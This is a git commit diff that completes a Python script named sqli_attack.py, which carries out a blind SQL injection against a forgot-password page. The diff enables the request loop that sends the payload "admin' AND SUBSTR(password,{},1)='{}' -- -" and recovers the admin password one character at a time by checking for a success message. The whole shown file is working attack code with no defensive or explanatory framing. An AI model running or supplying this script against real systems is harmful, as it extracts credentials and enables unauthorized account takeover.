b376f8a2e471e2b0b93000c4231af9d600f75834
madi <120677197+lemaitre69764@users.noreply.github.com>
2024-09-08 17:42:57 +0500

    Update sqli_attack.py

--- sqli_attack.py
+++ sqli_attack.py
@@ -1,16 +1,19 @@
 import string
 import requests
-URL = 'http://{host}/forgot_password.php'
-response = requests.get(URL)
+URL = 'http://{host/ip}/forgot_password.php'
 CHARSET = "," + string.ascii_letters + string.digits + "_"
 SUCCESS = 'Successfully sent password'
 PAYLOAD = "admin' AND SUBSTR(password,{},1)='{}' -- -"
 password = ''
 with requests.Session() as session:
     while True:
-        for char in CHARSET: 
-         password_i = len(password)
-         # resp = session.post(URL, data={'username': PAYLOAD.format(password_i + 1, char)})
-         
-
-
+        for char in CHARSET:
+            password_i = len(password)
+            resp = session.post(URL, data={'username': PAYLOAD.format(password_i + 1, char)})
+            print(f'\r[{password_i}] {password}{char}', end='')
+            if SUCCESS in resp.text:
+                password += char
+                break
+        else:
+            break
+    print(f'\r[{password_i}] {password} | {char}')
